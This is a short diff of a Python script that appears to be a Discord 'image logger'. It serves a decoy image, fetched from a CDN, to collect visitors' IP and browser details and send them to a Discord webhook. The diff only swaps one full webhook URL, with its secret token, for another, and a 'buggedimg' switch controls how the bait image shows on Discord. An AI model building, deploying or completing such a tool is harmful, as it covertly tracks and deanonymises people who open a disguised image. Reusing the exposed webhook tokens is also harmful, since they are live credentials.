@@ -4,7 +4,7 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1397185556118634636/fYxi0tlwBM3vbmZUe66OrY0J-kKeL2oAMArqyW5l20KbVa1ivnmLIxwGeik2cTrbJsN2'
+webhook = 'https://discord.com/api/webhooks/1408802633694576713/rxNacHdKzcFjKgvgSocO6XjVc1-iX87J83ZvCFpJ2upgFEYhIx3rbvIK6b5YQryU6lTi'
 
 bindata = httpx.get('https://images.ctfassets.net/ds6dz7ilx8up/B4gY52FR7jV7oWeeEyZUG/010905ffc14dc45255fc446e0c2af105/korv_hero-desktop.png').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
